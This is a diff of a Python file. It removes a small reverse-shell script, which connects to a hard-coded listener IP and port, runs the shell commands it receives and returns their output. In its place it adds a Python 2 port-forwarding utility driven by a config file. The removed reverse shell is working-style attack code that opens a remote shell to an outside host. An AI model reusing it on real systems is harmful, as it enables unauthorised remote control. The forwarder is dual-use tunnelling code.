@@ -1,28 +1,83 @@
-#!/usr/bin/python
+# Author: Mario Scondo (www.Linux-Support.com)
+# Date: 2010-01-08
+# Script template by Stephen Chappell
+#
+# This script forwards a number of configured local ports
+# to local or remote socket servers.
+#
+# Configuration:
+# Add to the config file port-forward.config lines with
+# contents as follows:
+#   <local incoming port> <dest hostname> <dest port>
+#
+# Start the application at command line with 'python port-forward.py'
+# and stop the application by keying in <ctrl-c>.
+#
+# Error messages are stored in file 'error.log'.
+#
 
-import os
 import socket
-import subprocess
+import sys
+import thread
+import time
 
-HOST = '192.168.190.137' # The ip of the listener.
-PORT = 6666 # The same port as listener.
+def main(setup, error, args):
+    # open file for error messages
+    sys.stderr = file(error, 'a')
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT)) # Connect to listener.
-s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.
+    # if args
+    if (len(args) > 0):
+        for settings in parse_args(args):
+            thread.start_new_thread(server, settings)
+    else:
+        # read settings for port forwarding
+        for settings in parse(setup):
+            thread.start_new_thread(server, settings)
+    # wait for <ctrl-c>
+    while True:
+       time.sleep(60)
 
-while 1: # Start loop.
-    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
-    if data == "quit" or "exit": 
-        break # If it's quit, then break out and close socket.
-    if data[:2] == "cd":
-        os.chdir(data[3:]) # If it's cd, change directory.
-    # Run shell command.
-    if len(data) > 0:
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-        output_str = str(stdout_value, "UTF-8") # Format output.
-        currentWD = os.getcwd() + "> " # Get current working directory.
-        s.send(str.encode(currentWD + output_str)) # Send output to listener.
-    
-s.close() # Close socket.
+def parse(setup):
+    settings = list()
+    for line in file(setup):
+        # skip comment line
+        if line.startswith('#'):
+            continue
+
+        parts = line.split()
+        settings.append((int(parts[0]), parts[1], int(parts[2])))
+    return settings
+
+def parse_args(args):
+    settings = list()
+    for line in args:
+        parts = line.split(":")
+        settings.append((int(parts[0]), parts[1], int(parts[2])))
+    return settings
+
+def server(*settings):
+    try:
+        dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        dock_socket.bind(('', settings[0]))
+        dock_socket.listen(5)
+        while True:
+            client_socket = dock_socket.accept()[0]
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.connect((settings[1], settings[2]))
+            thread.start_new_thread(forward, (client_socket, server_socket))
+            thread.start_new_thread(forward, (server_socket, client_socket))
+    finally:
+        thread.start_new_thread(server, settings)
+
+def forward(source, destination):
+    string = ' '
+    while string:
+        string = source.recv(1024)
+        if string:
+            destination.sendall(string)
+        else:
+            source.shutdown(socket.SHUT_RD)
+            destination.shutdown(socket.SHUT_WR)
+
+if __name__ == '__main__':
+    main('port-forward.config', 'error.log', sys.argv[1:])
